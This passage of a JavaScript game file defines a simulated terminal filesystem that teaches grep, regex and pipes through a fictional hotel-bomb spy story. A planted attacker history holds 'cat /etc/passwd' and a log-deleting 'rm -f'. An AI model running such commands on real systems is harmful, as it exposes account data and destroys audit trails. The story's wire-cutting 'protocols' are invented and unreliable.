home directories. Others swear by frequency 161.7 MHz.

We don't officially endorse either of these. But we don't
officially deny them either.

════════════════════════════════════════════════════════════════════

The clock is ticking. Lives depend on your analysis.

Good hunting.

- BLACKSITE Command`
                },

                '/home/analyst/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['raven-patterns.txt', 'consortium-leads.txt', 'todo.txt']
                },

                '/home/analyst/notes/raven-patterns.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `RAVEN Pattern Analysis - Personal Notes
═══════════════════════════════════════════════════════════

CONFIRMED PATTERNS:
  - Uses IP addresses as memory aids (192.168.1.105 = Room 105)
  - CRIMSON protocol for wire configurations
  - Former military EOD - knows counter-measures
  - Operates between 0100-0200 local time

THINGS TO GREP FOR:
  - "RAVEN" (case insensitive, he uses aliases)
  - "105" (the room number)
  - "CRIMSON" (wire protocol)
  - "192.168.1.105" (his source IP)
  - "maintenance" (his cover role)
  - "disabled" or "override" (his MO)

WIRE PROTOCOL NOTES:
  Check /blacksite/intercepts/consortium-comms/ for details
  CRIMSON protocol mentioned in multiple intercepts
  May need regex to decode the pattern

REMEMBER:
  grep -i = case insensitive
  grep -r = recursive (search directories)
  grep -n = show line numbers
  grep -c = count matches
  grep -v = invert (exclude matches)
  grep -l = list files only

This is what you're trained for. Focus.`
                },

                '/home/analyst/notes/consortium-leads.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `CONSORTIUM Investigation - Working Notes
═══════════════════════════════════════════════════════════

THE COUNCIL (4 members, identities unknown):
  GRANITE - Operations commander, possible CIA background
  OBELISK - Financial mastermind, British accent
  CIPHER  - Intelligence specialist, possibly NSA
  VECTOR  - Technology/cyber, Silicon Valley connections

WHAT WE KNOW:
  - 847 shell companies across 23 jurisdictions
  - Active since at least 1971
  - Penetration in multiple intelligence agencies
  - Profit from chaos: shorts before crises

MERIDIAN CONNECTION:
  - RAVEN is a Consortium contractor
  - $2.5M payment confirmed
  - Short positions on summit attendee companies
  - Estimated profit if attack succeeds: $2.3 billion

FILES TO REVIEW:
  /blacksite/consortium/structure.txt
  /blacksite/consortium/financial-network.txt
  /blacksite/subjects/consortium-members/
  /blacksite/intercepts/consortium-comms/

PATTERN:
  They create the crisis.
  They profit from the crisis.
  They never get caught.

Until now?`
                },

                '/home/analyst/notes/todo.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `OPERATION MERIDIAN - Analysis Checklist
═══════════════════════════════════════════════════════════

PHASE 1: GREP FUNDAMENTALS
[ ] Find RAVEN in auth logs (use -i for case insensitive)
[ ] Count RAVEN's system accesses (use -c)
[ ] Find Room 105 references with line numbers (use -n)
[ ] Identify anomalous keycard entries (use -v to exclude normal)
[ ] Search all intel files recursively (use -r)
[ ] Get context around CRITICAL alerts (use -C, -A, or -B)
[ ] List files mentioning bomb threat (use -l)
[ ] Find exact room number in radio intercept (use -w)

PHASE 2: REGEX PATTERNS
[ ] Decode wire protocol patterns
[ ] Extract IP addresses
[ ] Match timestamp formats
[ ] Find encoded messages

PHASE 3: PIPELINE MASTERY
[ ] Chain commands with pipes
[ ] Sort and deduplicate findings
[ ] Build the defusal sequence

FINAL: BOSS CHALLENGE
[ ] Combine all skills
[ ] Race the clock
[ ] Save the summit

Time is not on our side. Move fast.`
                },

                '/home/analyst/quickref.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `BLACKSITE QUICK REFERENCE
═══════════════════════════════════════════════════════════

NAVIGATION:
  cd /var/log        <- Mission files (hotel logs)
  cd /blacksite      <- Intelligence database
  cd ~               <- Your home directory
  cd -               <- Previous directory
  pwd                <- Where am I?

KEY LOCATIONS:
  /var/log/                    Active operation logs
  /var/log/intel/              Threat assessments
  /blacksite/classified/       Surveillance programs
  /blacksite/leaks/            Whistleblower docs
  /blacksite/intercepts/       Signals intelligence
  /blacksite/subjects/         Dossiers
  /blacksite/consortium/       The shadow network

GREP ESSENTIALS:
  grep "pattern" file          Basic search
  grep -i "pattern" file       Case insensitive
  grep -r "pattern" dir/       Recursive search
  grep -n "pattern" file       Show line numbers
  grep -c "pattern" file       Count matches
  grep -v "pattern" file       Invert (exclude)
  grep -l "pattern" dir/*      List matching files
  grep -w "word" file          Whole word only
  grep -A 2 "pattern" file     Show 2 lines after
  grep -B 2 "pattern" file     Show 2 lines before
  grep -C 2 "pattern" file     Show 2 lines context

PIPE EXAMPLES:
  cat file | grep "x"          Filter content
  grep "x" file | wc -l        Count results
  cat file | sort | uniq       Remove duplicates
  grep "x" * | head -20        First 20 matches

REMEMBER:
  Tab = autocomplete
  Up/Down = command history
  Ctrl+R = search history
  Ctrl+C = cancel
  Ctrl+L = clear screen

The truth is in the logs. Find it.`
                },

                // ══════════════════════════════════════════════════════════
                // NO DEAD ENDS - Fill all system directories
                // ══════════════════════════════════════════════════════════

                '/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['session.log', '.raven_cache', 'consortium_drop.enc']
                },

                '/tmp/session.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `BLACKSITE Session Log
Started: 2024-01-15 02:16:33 UTC
Analyst: Level 4 Clearance
Terminal: logserver.blacksite.local

[02:16:33] Session initialized
[02:16:34] Loaded module: GPM-001 (Grep Fundamentals)
[02:16:35] Active operation: MERIDIAN DEFUSAL
[02:16:36] Timer synchronized with field asset PHOENIX
[02:17:01] WARNING: Consortium activity detected on network
[02:17:15] NOTICE: You are being watched. Work fast.`
                },

                '/tmp/.raven_cache': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
                    content: `# Recovered from RAVEN's session before logout
# Partial command history - he didn't clear everything

cat /etc/passwd
whoami
cd /var/log
rm -f access.log.bak
disable_floor_sensors --floor=1
echo "Room matches IP. Easy to remember." > /dev/null
exit

# Note: RAVEN was sloppy. This is how we track patterns.`
                },

                '/tmp/consortium_drop.enc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'shadow',
                    content: `-----BEGIN ENCRYPTED MESSAGE-----
VGhlIENvbnNvcnRpdW0gc2VlcyBhbGwuIFRoZSBDb25zb3J0aXVtIGtub3dzIGFs
bC4gWW91IGFyZSBub3QgYXMgaGlkZGVuIGFzIHlvdSB0aGluay4gV2Uga25vdyB5
b3UncmUgcmVhZGluZyB0aGlzLiBXZSBrbm93IHdobyB5b3UgYXJlLiBUaGUgcXVl
c3Rpb24gaXM6IGRvIHlvdSBrbm93IHdobyB3ZSBhcmU/IFRpY2sgdG9jay4gVGhl
IGNsb2NrIGlzIHJ1bm5pbmcuIEdSQU5JVEUgc2VuZHMgcmVnYXJkcy4=
-----END ENCRYPTED MESSAGE-----

# Try: cat /tmp/consortium_drop.enc | base64 -d`
                },

                '/root': {
                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'root',
                    children: ['.bash_history', 'ADMIN_NOTICE.txt', 'emergency_protocols.txt']
                },

                '/root/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
                    content: `systemctl status blacksite-monitor
tail -f /var/log/auth.log
grep "RAVEN" /var/log/*.log
cd /blacksite/intercepts
cat consortium-comms/meeting-transcript-001.txt
openssl enc -d -aes-256-cbc -in /tmp/consortium_drop.enc
ssh phoenix@field-unit.blacksite.local
systemctl restart alert-daemon
grep -r "CRIMSON" /blacksite/
cat /blacksite/subjects/RAVEN.dossier`
                },

                '/root/ADMIN_NOTICE.txt': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
                    content: `BLACKSITE ADMINISTRATOR NOTICE
═══════════════════════════════════════════════════════════

TO: All Level 4+ Analysts
FROM: BLACKSITE Command
DATE: 2024-01-15

RE: Operation MERIDIAN DEFUSAL

This terminal has been provisioned for emergency analyst access.
Full database read access has been granted due to the time-critical
nature of the current operation.

NORMAL RESTRICTIONS LIFTED:
  - /blacksite/classified - FULL ACCESS
  - /blacksite/leaks - FULL ACCESS
  - /blacksite/consortium - FULL ACCESS

REMEMBER:
  1. Everything is logged
  2. There are no secrets here - only truths not yet found
  3. The Consortium has penetrated systems before
  4. Trust the data, not the people

If this operation succeeds, you'll never be thanked.
If it fails, you'll never be blamed.
That's how this works.

Good luck.

- Root
  BLACKSITE Infrastructure`
                },

                '/root/emergency_protocols.txt': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
                    content: `EMERGENCY DEFUSAL PROTOCOLS
Classification: TOP SECRET

If all else fails, these are the known Consortium wire protocols:

CRIMSON PROTOCOL (RAVEN's preferred):
  - Red wire: ALWAYS cut last
  - Blue wire: Cut first if timer shows even seconds
  - Green wire: Cut first if timer shows odd seconds
  - Yellow wire: NEVER cut (decoy/trigger)

COBALT PROTOCOL:
  - Sequence: Green -> Blue -> Red
  - Yellow is always safe in Cobalt

OBSIDIAN PROTOCOL:
  - All wires are decoys except one
  - Check for secondary trigger mechanism
  - Usually requires disabling power source first

NOTE: RAVEN uses CRIMSON. Check intercepts to confirm.

FIELD ASSET CONTACT:
  Agent PHOENIX is on encrypted channel.
  Provide wire sequence when confirmed.

DO NOT GUESS. Verify with data.
Wrong wire = immediate detonation.`
                },

                '/etc': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['passwd', 'shadow', 'hosts', 'motd', 'blacksite.conf', 'sudoers']
                },

                '/etc/motd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗██╗████████╗  ║
║   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║╚══██╔══╝  ║
║   ██████╔╝██║     ███████║██║     █████╔╝ ███████╗██║   ██║     ║
║   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║     ║
║   ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗███████║██║   ██║     ║
║   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝     ║
║                                                                  ║
║              SIGNALS INTELLIGENCE ARCHIVE TERMINAL               ║
║                                                                  ║
║   "The truth is not for all men, but only for those who seek it"║
║                                          - Ayn Rand              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

WARNING: This system contains classified intelligence. All access
is monitored and logged. Unauthorized access will be prosecuted.

Current Operation: MERIDIAN DEFUSAL [CRITICAL]
Time Status: CHECK TERMINAL CLOCK

Type 'cat ~/BRIEFING.txt' for mission orientation.
`
                },

                '/etc/blacksite.conf': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `# BLACKSITE Terminal Configuration
# Version: 4.7.2
# Last Modified: 2024-01-15

[system]
node_id = 7
cluster_size = 12
sync_interval = 300
classification_default = TOP_SECRET

[database]
path = /blacksite
read_only = true
encryption = AES-256-GCM
audit_all_access = true

[network]
upstream = sigint-primary.blacksite.local
backup = sigint-secondary.blacksite.local
tor_enabled = true
vpn_required = true

[operations]
current = MERIDIAN_DEFUSAL
priority = CRITICAL
analyst_clearance = LEVEL_4
time_remaining = CHECK_TERMINAL

[consortium_tracking]
enabled = true
known_nodes = 847
identified_members = 0
priority = MAXIMUM

[logging]
level = DEBUG
destination = /var/log/blacksite/
retain_days = 365
encrypt_logs = true

# Note: If you're reading this, you're curious. Good.
# Curiosity is how we find them.`
                },

                '/etc/sudoers': {
                    type: 'file', perms: '-r--r-----', owner: 'root', group: 'root',
                    content: `# BLACKSITE sudoers configuration
# Analysts have read access, not write

root    ALL=(ALL:ALL) ALL
analyst ALL=(ALL) NOPASSWD: /bin/cat, /bin/grep, /usr/bin/find, /bin/ls

# Note: Analysts can read anything.
# They cannot modify evidence.
# That's the point.`
                },

                '/usr': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['bin', 'share', 'local']
                },

                '/usr/share': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['blacksite', 'doc']
                },

                '/usr/share/blacksite': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['welcome.txt', 'version.txt']
                },

                '/usr/share/blacksite/welcome.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `BLACKSITE Intelligence Terminal
═══════════════════════════════════════════════════════════

You've found the system files. Thorough.

This terminal is one of 12 nodes in the BLACKSITE network.
Each node mirrors the central intelligence archive with a
5-minute sync delay. What you see here is what we know.

The system was built after the 2013 disclosures made it clear
that intelligence was being collected but not analyzed with
proper oversight. BLACKSITE exists outside official channels.

We are not whistleblowers. We are not activists.
We are analysts who believe the truth should be findable
by those who know how to look.

You're here because you know how to look.

Start with the mission: /var/log
Explore the depths: /blacksite
Find what they've hidden.

"Three may keep a secret, if two of them are dead."
  - Benjamin Franklin

The Consortium thinks they're the only ones watching.
They're wrong.`
                },

                '/usr/share/blacksite/version.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `BLACKSITE Terminal System
Version: 4.7.2
Build: 20240115-MERIDIAN
Node: 7 of 12

Changelog:
  4.7.2 - Added Consortium intercept module
  4.7.1 - MERIDIAN DEFUSAL operation support
  4.7.0 - Enhanced grep/regex training integration
  4.6.x - Vault7 archive integration
  4.5.x - Financial intercept correlation
  4.4.x - Snowden archive unreleased docs
  4.3.x - Consortium tracking initialization

Network Status: ACTIVE
Database Sync: CURRENT
Classification: TOP SECRET//SI//BLACKSITE

"We watch the watchers."`
                },

                '/usr/share/doc': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['grep.txt', 'regex.txt', 'pipes.txt']
                },

                '/usr/share/doc/grep.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `GREP - Pattern Hunting Essentials
═══════════════════════════════════════════════════════════

Grep is your primary weapon for intelligence analysis.
Master these patterns:

BASIC:
  grep "RAVEN" file.log         # Find RAVEN
  grep -i "raven" file.log      # Case insensitive
  grep -r "pattern" /dir/       # Search recursively

COUNTING:
  grep -c "error" log.txt       # Count matches
  grep -l "secret" *.txt        # List matching files

CONTEXT:
  grep -n "critical" file       # Show line numbers
  grep -A 3 "error" file        # 3 lines After match
  grep -B 3 "error" file        # 3 lines Before match
  grep -C 3 "error" file        # 3 lines Context (both)

INVERSE:
  grep -v "normal" file         # Lines NOT matching

COMBINATIONS:
  grep -rni "consortium" /blacksite/
    r = recursive
    n = line numbers
    i = case insensitive

In intelligence work, grep is how you find the needle.
The haystack is /blacksite. Start searching.`
                },

                '/usr/share/doc/regex.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `REGEX - Pattern Matching Power
═══════════════════════════════════════════════════════════

Regular expressions let you match patterns, not just strings.

BASICS:
  .         Any single character
  *         Zero or more of previous
  +         One or more of previous
  ?         Zero or one of previous
  ^         Start of line
  $         End of line

CHARACTERS:
  [abc]     Any of: a, b, or c
  [^abc]    Any except: a, b, c
  [0-9]     Any digit
  [a-z]     Any lowercase letter
  \\d        Any digit (shorthand)
  \\w        Any word character
  \\s        Any whitespace

EXAMPLES:
  grep -E "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}" file
    # Match IP addresses

  grep -E "^CRITICAL" file
    # Lines starting with CRITICAL

  grep -E "RAVEN|GRANITE|CIPHER" file
    # Match any of these codenames

USE -E FOR EXTENDED REGEX (easier syntax)

The wire protocol is encoded. Regex will decode it.`
                },

                '/usr/share/doc/pipes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `PIPES - Command Chaining
═══════════════════════════════════════════════════════════

Pipes connect command output to command input.
This is how you build analysis pipelines.

BASIC PIPE:
  cat file | grep "pattern"
  # Output of cat flows into grep

COMMON PATTERNS:
  grep "error" log | wc -l
    # Count error lines

  cat file | sort | uniq
    # Remove duplicates

  cat file | sort | uniq -c | sort -rn
    # Count unique entries, sort by frequency

  grep "RAVEN" * | cut -d: -f1 | uniq
    # List files containing RAVEN

USEFUL COMMANDS TO PIPE:
  sort      - Sort lines
  uniq      - Remove/count duplicates (-c to count)
  wc        - Count lines/words/chars (-l for lines)
  head      - First N lines (-n 10)
  tail      - Last N lines (-n 10)
  cut       - Extract fields (-d: delimiter, -f1 field)
  tr        - Translate characters
  awk       - Pattern processing
  sed       - Stream editing

EXAMPLE ANALYSIS:
  grep -r "192.168" /var/log/ | cut -d: -f2 | sort | uniq -c | sort -rn
    # Find most common IP addresses in logs

Build the pipeline. Find the pattern. Defuse the bomb.`
                },

                // ══════════════════════════════════════════════════════════
                // MISSION FILES - /var/log (Hotel Security Logs)
                // ══════════════════════════════════════════════════════════

                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'access.log', 'keycard.log', 'security_alerts.log', 'radio_intercept.txt', 'guest_registry.log', 'maintenance.log', 'intel']
                },
                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
                    content: `Jan 15 01:47:22 meridian-sec sshd[4521]: Connection from 192.168.1.105 port 49221
Jan 15 01:47:25 meridian-sec sshd[4521]: Failed password for maintenance from 192.168.1.105 port 49221 ssh2
Jan 15 01:47:28 meridian-sec sshd[4521]: Failed password for maintenance from 192.168.1.105 port 49221 ssh2
Jan 15 01:48:01 meridian-sec sshd[4522]: Accepted password for housekeeping from 10.0.0.15 port 22445 ssh2
Jan 15 01:48:33 meridian-sec sshd[4523]: Failed password for admin from 192.168.1.105 port 49225 ssh2
Jan 15 01:48:55 meridian-sec sudo: housekeeping : TTY=pts/0 ; PWD=/var/log ; COMMAND=/bin/cat guest_registry.log
Jan 15 01:49:12 meridian-sec sshd[4524]: Accepted password for RAVEN from 192.168.1.105 port 49230 ssh2
Jan 15 01:49:15 meridian-sec sudo: RAVEN : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/bin/bash
Jan 15 01:49:22 meridian-sec sshd[4524]: session opened for user RAVEN
Jan 15 01:50:01 meridian-sec CRON[5001]: (root) CMD (/usr/bin/security_sweep.sh)
Jan 15 01:52:33 meridian-sec sudo: RAVEN : TTY=pts/1 ; COMMAND=/usr/bin/disable_floor_sensors --floor=1
Jan 15 01:55:00 meridian-sec sshd[4524]: session closed for user RAVEN
Jan 15 02:14:33 meridian-sec sshd[4601]: Failed password for root from 192.168.1.105 port 50001 ssh2
Jan 15 02:15:45 meridian-sec sshd[4602]: Connection dropped from 192.168.1.105 - protocol error
Jan 15 02:30:00 meridian-sec CRON[5100]: (security) CMD (/usr/bin/patrol_check.sh)`
                },
                '/var/log/access.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
                    content: `192.168.1.105 - RAVEN [15/Jan:01:49:12] "POST /elevator/override HTTP/1.1" 200
192.168.1.105 - RAVEN [15/Jan:01:49:45] "GET /cameras/floor1/disable HTTP/1.1" 200
192.168.1.105 - RAVEN [15/Jan:01:50:22] "POST /keycard/clone?room=105 HTTP/1.1" 200
192.168.1.105 - RAVEN [15/Jan:01:51:00] "GET /maintenance/schedule HTTP/1.1" 200
192.168.1.105 - RAVEN [15/Jan:01:52:15] "POST /alarm/zone1/disable HTTP/1.1" 200
10.0.0.15 - housekeeping [15/Jan:01:48:01] "GET /schedule/today HTTP/1.1" 200
10.0.0.20 - frontdesk [15/Jan:02:00:00] "GET /reservations HTTP/1.1" 200
172.16.0.50 - guest [15/Jan:02:05:00] "GET /wifi/connect HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:14:33] "GET /admin HTTP/1.1" 403
192.168.1.105 - - [15/Jan:02:15:00] "POST /root/shell HTTP/1.1" 401 BLOCKED`
                },
                '/var/log/keycard.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 3072,
                    content: `[KEYCARD SYSTEM - MERIDIAN HOTEL - FLOOR 1]
========================================
Jan 15 01:30:00 ROOM-101 ACCESS: Guest "Morrison, T." - ENTRY
Jan 15 01:32:15 ROOM-102 ACCESS: Guest "Chen, L." - ENTRY
Jan 15 01:35:00 ROOM-103 ACCESS: Housekeeping Staff - ENTRY
Jan 15 01:35:45 ROOM-103 ACCESS: Housekeeping Staff - EXIT
Jan 15 01:40:00 STAIRWELL-A ACCESS: Security Patrol - ENTRY
Jan 15 01:45:00 ROOM-104 ACCESS: Guest "Williams, R." - ENTRY
Jan 15 01:50:22 ROOM-105 ACCESS: MAINTENANCE OVERRIDE - ENTRY [ANOMALY]
Jan 15 01:50:25 ROOM-105 ACCESS: Motion sensor DISABLED
Jan 15 01:52:00 ROOM-105 ACCESS: NO EXIT RECORDED [ANOMALY]
Jan 15 01:55:00 ELEVATOR-SVC ACCESS: Maintenance Code 7734 - ACTIVATED
Jan 15 02:00:00 ROOM-106 ACCESS: Guest "Park, S." - ENTRY
Jan 15 02:05:00 CONF-ROOM-A ACCESS: Setup Crew - ENTRY
Jan 15 02:10:00 STAIRWELL-B ACCESS: Unauthorized - DENIED
Jan 15 02:15:00 BALLROOM ACCESS: Catering Staff - ENTRY
[WARNING] Room 105 - Guest "Blackwood, M." checked out 3 days ago. Room should be VACANT.
[ALERT] Room 105 maintenance override at 01:50 does not match any scheduled work orders.`
                },
                '/var/log/security_alerts.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2560,
                    content: `[MERIDIAN HOTEL SECURITY SYSTEM - CRITICAL ALERTS]
=====================================================
Jan 15 01:49:15 [CRITICAL] Unauthorized sudo escalation - user RAVEN
Jan 15 01:50:20 [WARNING] Floor 1 motion sensors offline - manual override
Jan 15 01:50:25 [ERROR] Camera CAM-107 feed interrupted - Room 105 corridor
Jan 15 01:51:00 [WARNING] Service elevator accessed outside schedule
Jan 15 01:52:33 [CRITICAL] Floor sensor array DISABLED - security bypass detected
Jan 15 01:53:00 [ERROR] Smoke detector 105-A reporting intermittent signal
Jan 15 01:55:00 [INFO] Session terminated - user RAVEN - connection 192.168.1.105
Jan 15 02:00:00 [INFO] Night patrol completed - Floor 1 clear
Jan 15 02:10:00 [WARNING] Stairwell B unauthorized access attempt - DENIED
Jan 15 02:14:00 [INFO] CEO Summit security briefing uploaded
Jan 15 02:15:00 [CRITICAL] ANOMALY: Room 105 thermal signature detected - room should be vacant
Jan 15 02:16:00 [ALERT] Initiating protocol BLACKSITE - analyst team notified
[PRIORITY] Thermal scan shows heat signature consistent with electronic device in Room 105.
[PRIORITY] Device appears to have countdown mechanism - BOMB SQUAD ALERTED.`
                },
                '/var/log/radio_intercept.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 2048,
                    content: `[INTERCEPTED RADIO TRAFFIC - ENCRYPTED CHANNEL 7]
=================================================
[TIMESTAMP: 01:45:00] RAVEN: "Nest is prepared. Package arriving via service entrance."
[TIMESTAMP: 01:48:00] CONTROL: "Confirm room number for delivery."
[TIMESTAMP: 01:48:15] RAVEN: "Room matches the asset IP. Easy to remember. One-zero-five."
[TIMESTAMP: 01:50:00] RAVEN: "Sensors disabled. I'm a ghost."
[TIMESTAMP: 01:52:00] RAVEN: "Package is planted. Timer set for summit. Six hours."
[TIMESTAMP: 01:53:00] CONTROL: "Wire configuration?"
[TIMESTAMP: 01:53:30] RAVEN: "Standard CRIMSON protocol. They'll never figure it out in time."
[TIMESTAMP: 01:54:00] CONTROL: "Extraction route?"
[TIMESTAMP: 01:54:30] RAVEN: "Service elevator to basement. Car waiting on 4th Street."
[TIMESTAMP: 01:55:00] RAVEN: "I'm out. The Meridian will make headlines tomorrow."
[TIMESTAMP: 01:55:30] CONTROL: "Good work, RAVEN. The consortium sends its regards."
[END INTERCEPT - FORWARDED TO BLACKSITE COMMAND]`
                },
                '/var/log/guest_registry.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1536,
                    content: `[MERIDIAN HOTEL - GUEST REGISTRY - FLOOR 1]
=========================================
ROOM  | GUEST NAME        | CHECK-IN   | CHECK-OUT  | STATUS
------+-------------------+------------+------------+---------
101   | Morrison, Thomas  | Jan 14     | Jan 17     | OCCUPIED
102   | Chen, Lisa        | Jan 14     | Jan 16     | OCCUPIED
103   | [VACANT]          | -          | -          | AVAILABLE
104   | Williams, Robert  | Jan 15     | Jan 18     | OCCUPIED
105   | Blackwood, Marcus | Jan 10     | Jan 12     | CHECKED OUT
106   | Park, Soo-Yeon    | Jan 14     | Jan 16     | OCCUPIED
107   | Davies, Emma      | Jan 13     | Jan 15     | CHECKOUT TODAY
108   | [VACANT]          | -          | -          | AVAILABLE

[NOTE] Room 105 scheduled for deep cleaning Jan 16. No reservations until Jan 20.
[FLAG] Room 105 keycard access logged at 01:50 - no guest assigned. INVESTIGATE.`
                },
                '/var/log/maintenance.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
                    content: `[MERIDIAN HOTEL - MAINTENANCE LOG]
===================================
Jan 15 00:00:00 Night shift started - Staff: Martinez, Wong
Jan 15 00:30:00 HVAC check - Ballroom - COMPLETE
Jan 15 01:00:00 Elevator inspection - COMPLETE
Jan 15 01:30:00 Pool filter maintenance - COMPLETE
Jan 15 02:00:00 Emergency exit lights check - COMPLETE

[NO SCHEDULED WORK FOR FLOOR 1 GUEST ROOMS TONIGHT]

*** ANOMALY DETECTED ***
System shows maintenance override for Room 105 at 01:50.
This does not match any authorized work order.
Override code used: 7734 (assigned to: TERMINATED EMPLOYEE - J. Raven)
SECURITY HAS BEEN NOTIFIED.`
                },
                '/var/log/intel': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'intel',
                    children: ['threat_assessment.txt', 'summit_attendees.txt', 'raven_dossier.txt']
                },
                '/var/log/intel/threat_assessment.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 1024,
                    content: `[CLASSIFIED - THREAT ASSESSMENT]
================================
THREAT LEVEL: CRITICAL
TARGET: CEO Summit - Meridian Hotel Grand Ballroom
DATE: January 15 - 08:00 AM Start
ATTENDEES: 47 Fortune 500 executives

SUSPECTED THREAT:
- IED planted in Room 105 (directly below Ballroom)
- Timer mechanism detected - estimated 6 hour countdown
- Blast radius: 50 meters - CATASTROPHIC if detonated

OPERATIVE:
- Codename: RAVEN
- Former hotel maintenance staff (terminated 6 months ago)
- Connected to "Consortium" - corporate terrorism cell

RESPONSE:
- Agent PHOENIX dispatched to hotel
- BLACKSITE analyst team activated (YOU)
- Bomb squad on standby - need wire configuration first`
                },
                '/var/log/intel/summit_attendees.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 512,
                    content: `[CEO SUMMIT - CONFIDENTIAL ATTENDEE LIST]
=========================================
- Hartwell, CEO - Nexus Industries
- Yamamoto, CEO - Kyoto Electronics
- Okonkwo, CEO - AfriTech Global
- Mueller, CEO - Dresden Manufacturing
- Chen, CEO - Shanghai Dynamics
- Petrova, CEO - Moscow Energy Corp
[... 41 additional executives ...]

TOTAL VALUE OF REPRESENTED COMPANIES: $4.7 TRILLION
INSURANCE IMPLICATION: CATASTROPHIC
THIS SUMMIT CANNOT BE CANCELLED - MUST DEFUSE THE DEVICE`
                },
                '/var/log/intel/raven_dossier.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 768,
                    content: `[OPERATIVE DOSSIER - CLASSIFIED]
=================================
CODENAME: RAVEN
REAL NAME: James Raven (confirmed)
FORMER OCCUPATION: Meridian Hotel - Senior Maintenance Tech
TERMINATED: July 15 (6 months ago) - "budget cuts"
MOTIVE: Revenge + Consortium payment ($2.5M confirmed)

SKILLS:
- Building systems expert
- Electronics background (military EOD - dishonorably discharged)
- Known to use IP addresses as memory aids

KNOWN ALIASES:
- admin, maintenance, jraven, blackbird

LAST KNOWN LOCATION: Room 105, Meridian Hotel
CURRENT STATUS: FLED - Vehicle heading north on I-95

NOTE: RAVEN always uses "CRIMSON protocol" for wire configs.
This may be key to defusal. Check regex patterns in next phase.`
                },

                // ══════════════════════════════════════════════════════════
                // BLACKSITE DATABASE - The Conspiracy Epicenter
                // ══════════════════════════════════════════════════════════

                // Override root to add blacksite directories
                '/': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['home', 'etc', 'var', 'tmp', 'usr', 'bin', 'root', 'blacksite']
                },

                '/blacksite': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['README.txt', 'classified', 'leaks', 'intercepts', 'subjects', 'operations', 'archives', 'consortium']
                },

                '/blacksite/README.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `╔══════════════════════════════════════════════════════════════════╗
║                    B L A C K S I T E                             ║
║              SIGNALS INTELLIGENCE ARCHIVE v4.7.2                 ║
╚══════════════════════════════════════════════════════════════════╝

CLASSIFICATION: EYES ONLY / COMPARTMENTED
LAST SYNC: 2024-01-15 03:47:22 UTC
MIRROR STATUS: ACTIVE (Node 7 of 12)

WARNING: This terminal provides access to compartmented intelligence
gathered from multiple source networks. Contents include:

  /classified   - Black program documentation, surveillance ops
  /leaks        - Verified whistleblower documents, corporate dumps
  /intercepts   - SIGINT captures, decoded transmissions
  /subjects     - Person of interest dossiers, asset files
  /operations   - Active and historical operation files
  /archives     - Cold case files, buried incidents
